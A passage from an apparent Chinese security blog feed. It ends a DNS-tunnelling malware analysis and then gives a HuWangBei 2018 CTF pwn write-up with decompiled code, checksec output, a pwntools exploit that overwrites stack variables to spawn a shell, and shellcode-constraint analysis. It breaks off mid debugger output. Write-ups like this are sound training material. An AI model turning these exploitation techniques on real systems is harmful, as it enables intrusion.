title="3、总结"></a>3、总结</h2><p>&emsp;&emsp;通过对<code>此样本</code>的分析，我们可以得出一些<code>DNS隐蔽隧道通信</code>的特征，<code>C2</code>和<code>受控主机</code>都要对对方发过来的数据进行解析，会有一套<code>通信协议</code>。<strong><code>C2</code></strong>会向<strong><code>受控主机</code></strong>发送<code>命令</code>，让受控主机执行，<strong><code>受控主机</code></strong>会向<strong><code>C2</code></strong>发送<code>命令执行结果</code>或者是自己的<code>比较机密的文件</code>。数据可以通过<code>A记录</code>进行传送，<code>数据</code>包含在<code>域名中</code>(受控主机向C2发送数据)或者<code>域名解析IP</code>中(C2向受控主机发送数据)。也可以通过<code>TXT记录</code>进行传送，数据包含在<code>响应包</code>中的<code>TXT字段</code>中。</p><p>&emsp;&emsp;由于C2已经挂了，所以无法再通过流量进行更详细的分析，所以有些细节可能分析的不到位。通过对此样本的分析，我们了解了一种实现<code>DNS隐蔽信道通信</code>的方式以及通信所<code>使用的协议</code>。以后遇到这样的恶意软件就可以类比分析。目前很多<code>APT攻击</code>和其他很多的<code>恶意软件</code>都使用DNS隐蔽信道进行通信，所以对DNS隐蔽信道通信进行检测是一件很重要的事。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、<a href="https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/" target="_blank" rel="noopener">OilRig Uses Updated BONDUPDATER to Target Middle Eastern Government</a></p>]]></content>
      
      <categories>
          
          <category> 恶意软件分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS隐蔽信道通信 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>护网杯2018——WriteUp</title>
      <link href="/2018/10/26/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%E2%80%94%E2%80%94WriteUp/"/>
      <url>/2018/10/26/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%E2%80%94%E2%80%94WriteUp/</url>
      <content type="html"><![CDATA[<blockquote><p>好长时间没做CTF的题了，过段时间要去实习了，得抓紧时间熟悉熟悉以前学的，不然太菜会被鄙视的。<br>这篇文章写得是前段时间刚刚比完的护网杯中的Pwn和Reverse题目的WriteUp。<br>尽量写吧，不一定都会做，记录一下，以后忘了的时候可以快速回忆。<br>还有两门考试，一篇报告，惆怅，考完这两门就没课了。还算有点心理安慰。<br><a id="more"></a></p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h3><h4 id="0x00-file-amp-amp-checksec"><a href="#0x00-file-amp-amp-checksec" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file task_gettingStart_ktQeERc </span><br><span class="line">task_gettingStart_ktQeERc: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8889abb24c5308b96e8483d5dbdd1aa67fffdaa4, stripped</span><br><span class="line">$ checksec task_gettingStart_ktQeERc </span><br><span class="line">[*] &apos;/home/.../Desktop/gettingstart/task_gettingStart_ktQeERc&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="0x01-运行程序，观察程序功能"><a href="#0x01-运行程序，观察程序功能" class="headerlink" title="0x01 运行程序，观察程序功能"></a>0x01 运行程序，观察程序功能</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./task_gettingStart_ktQeERc </span><br><span class="line">HuWangBei CTF 2018 will be getting start after 139968784619408 seconds...</span><br><span class="line">But Whether it starts depends on you.</span><br><span class="line">csjkomso</span><br><span class="line">Try again!</span><br></pre></td></tr></table></figure><h4 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">double</span> v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">  v8 = <span class="number">1.797693134862316e308</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %lu seconds...\n"</span>, <span class="number">0L</span>L, <span class="number">1.797693134862316e308</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"But Whether it starts depends on you."</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v7 != <span class="number">0x7FFFFFFFFFFFFFFF</span>LL || v8 != <span class="number">0.1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %g seconds...\n"</span>, &amp;buf, v8);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，程序通过read()函数，向栈上的缓冲区复制了0x28字节的数据，然后判断<code>if ( v7 != 0x7FFFFFFFFFFFFFFFLL || v8 != 0.1 )</code>,如果成立，输出<code>Try again!</code>并退出，不成立则执行<code>system(&quot;/bin/sh&quot;)</code>获得shell,所以只要让<code>v7=0x7FFFFFFFFFFFFFFFLL</code>和<code>v8=0.1</code>,则获得shell。我们往上看，buf起始地址在<code>rsp+10h</code>,v7起始地址在<code>rsp+28h</code>,v8起始地址在<code>rsp+30h</code>,缓冲区长度为0x28,所以刚好可以构造输入的数据，覆盖v7和v8。这里的关键是0.1在内存中的形式是什么。我们通过IDA的图形视图可以很方便的找到if判断部分的代码：</p><div align="left"><br>    <img src="http://ww1.sinaimg.cn/large/006fbkm8gy1fwm0kqzi1ij30ei05qdg0.jpg" alt="if判断结构"><br></div><p>双击qword_C10，可以跳转到如下所示位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000000BF6 aTryAgain       db &apos;Try again!&apos;,0       ; DATA XREF: main:loc_A8E↑o</span><br><span class="line">.rodata:0000000000000C01                 align 8</span><br><span class="line">.rodata:0000000000000C08 qword_C08       dq 7FEFFFFFFFFFFFFFh    ; DATA XREF: main+4D↑r</span><br><span class="line">.rodata:0000000000000C10 qword_C10       dq 3FB999999999999Ah    ; DATA XREF: main+EE↑r</span><br></pre></td></tr></table></figure><p>可以看到0.1在内存中的表示为<code>0x3FB999999999999Ah</code>，我们还可以编写一个测试程序，以Hex形式输出0.1的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">0.1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%llx\n"</span>, *(<span class="keyword">long</span> <span class="keyword">long</span>*)&amp;a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h4><p>虽然这道题保护全开，但是对于利用没有阻碍。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote('117.78.40.144', 32671)</span></span><br><span class="line">p = process(<span class="string">"./task_gettingStart_ktQeERc"</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0x3FB999999999999A</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>emmmm这道题考察的主要是0.1在内存中的存储形式，具体的可以参考下面的链接。<br><a href="https://math.okstate.edu/people/yqwang/teaching/math5553_spring14/demo/0point1.pdf" target="_blank" rel="noopener">0.1 in double precision</a></p><h3 id="six"><a href="#six" class="headerlink" title="six"></a>six</h3><h4 id="0x00-file-amp-amp-checksec-1"><a href="#0x00-file-amp-amp-checksec-1" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file six</span><br><span class="line">six: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=426dd1b2aab668b73945b91d45568813be69b9c7, stripped</span><br><span class="line">$ checksec six</span><br><span class="line">[*] &apos;/home/.../Desktop/six/six&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>保护全部都开启了。</p><h4 id="0x01-观察程序行为"><a href="#0x01-观察程序行为" class="headerlink" title="0x01 观察程序行为"></a>0x01 观察程序行为</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./six</span><br><span class="line">Show Ne0 your shellcode:</span><br><span class="line">difjodkfoj</span><br><span class="line">Invalid shellcode!</span><br></pre></td></tr></table></figure><p>程序让我们输入一段shellcode，不正确则退出。</p><h4 id="0x02-IDA分析-1"><a href="#0x02-IDA分析-1" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> (__fastcall *v3)(__int64, <span class="keyword">char</span> *); <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  rand_mmap2();                                 <span class="comment">// 分配两块大小为0x1000的内存，起始地址随机</span></span><br><span class="line">  v3 = dest;                                    <span class="comment">// 分配的具有RWX权限内存的起始地址</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Show Ne0 your shellcode:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">6u</span>LL);                            <span class="comment">// 输入6个字节shellcode</span></span><br><span class="line">  check_shellcode(&amp;s);                          <span class="comment">// 检查shellcode格式</span></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(src);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, src, v4);                        <span class="comment">// 将src处的数据复制到dest,dest具有X权限</span></span><br><span class="line">  v5 = dest;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(src);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v5[v6], &amp;s, <span class="number">7u</span>LL);                    <span class="comment">// 将我们输入的shellcode放在src后面</span></span><br><span class="line">  v3(fake_stack, &amp;s);                           <span class="comment">// 调用dest处的shellcode</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两个自定义函数，经过分析函数功能，可以知道，第一个函数，也就是rand_mmap2()函数，随机分配了两块大小一样的内存块，不过所拥有的权限的不一样的。第二个函数是check_shellcode()，是对用户输入的shellcode进行格式检查，检查通过，则程序认为是有效的shellcode。下面我们进入这两个函数看一下,首先进入rand_mmap2()函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">rand_mmap2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST04_4</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);                    <span class="comment">// canary</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 从/dev/urandom读取两个随机数，作为分配内存的起始地址</span></span><br><span class="line">  read(fd, &amp;buf, <span class="number">6u</span>LL);</span><br><span class="line">  read(fd, &amp;v3, <span class="number">6u</span>LL);</span><br><span class="line">  dest = mmap((v3 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);<span class="comment">// 分配第一块内存，权限为RWX</span></span><br><span class="line">  fake_stack = mmap((buf &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) + <span class="number">0x500</span>;<span class="comment">// 分配第二块内存，权限为RW</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过搜索，我们知道，此函数从/dev/urandom读取了两个随机数，分别作为将要分配的两块内存的起始地址。这里为什么是6个字节的地址呢，因为64bit的CPU只有48位地址总线，也就是6个字节，64bit的程序只能访问2^48大小的虚拟内存。然后，分配了两块大小为0x1000的内存块，第一块dest的权限为RWX,第二块fake_stack的权限为RW。</p><p>接下来，我们进入check_shellcode函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check_shellcode</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) &amp; <span class="number">1</span> )                        <span class="comment">// 该字节最低位为1</span></span><br><span class="line">      ++v2;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 该字节最低位为0</span></span><br><span class="line">      ++v3;</span><br><span class="line">    <span class="keyword">for</span> ( j = i + <span class="number">1</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(i + a1) == *(j + a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid shellcode!"</span>);             <span class="comment">// 6个字节互不相同</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid shellcode!"</span>);                 <span class="comment">// 三个字节为偶数，三个字节为奇数</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函数对我们传入的6字节shellcode进行了判断，shellcode应该满足的条件是，6个字节的值会不相等，并且三个字节为偶数，三个字节为奇数，才是有效的shellcode,否则退出。</p><p>我们再来看看接下来，主程序做了什么。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">rand_mmap2();                                 <span class="comment">// 分配两块大小为0x1000的内存，起始地址随机</span></span><br><span class="line">v3 = dest;                                    <span class="comment">// 分配的具有RWX权限内存的起始地址</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Show Ne0 your shellcode:"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;s, <span class="number">6u</span>LL);                            <span class="comment">// 输入6个字节shellcode</span></span><br><span class="line">check_shellcode(&amp;s);                          <span class="comment">// 检查shellcode格式</span></span><br><span class="line">v4 = <span class="built_in">strlen</span>(src);</span><br><span class="line"><span class="built_in">memcpy</span>(dest, src, v4);                        <span class="comment">// 将src处的数据复制到dest,dest具有X权限</span></span><br><span class="line">v5 = dest;</span><br><span class="line">v6 = <span class="built_in">strlen</span>(src);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;v5[v6], &amp;s, <span class="number">7u</span>LL);                    <span class="comment">// 将我们输入的shellcode放在src后面</span></span><br><span class="line">v3(fake_stack, &amp;s);                           <span class="comment">// 调用dest处的shellcode</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure><p>首先程序分配了两块0x1000的内存，然后让我们输入了6字节的shellcode，并对shellcode进行检查。然后将src处的数据复制到刚才分配的具有可执行权限的内存块，然后将我们输入的shellcode接在src的后面，然后执行。不具有可执行权限的内存块用于伪造栈。</p><p>通过gdb调试，我们可以知道，当从/dev/urandom读出来的数值较大时，mmap随机进行分配内存块。而当二者均随机分配时，则这两个内存块有可能是相连的。这里第一次分配的内存块在高地址，用于存放shellcode,第二次分配的内存块在低地址，用于伪造栈。至于这里为什么第一次分配的内存块在高地址，而第二次的在低地址，我还没有搞清楚这里面的机制。看的资料都说是随机分配，没找到具体的。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、第一次调试</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">rsp</span>  <span class="number">0x7fffffffdcc0</span> ◂— <span class="number">0x300000001</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span 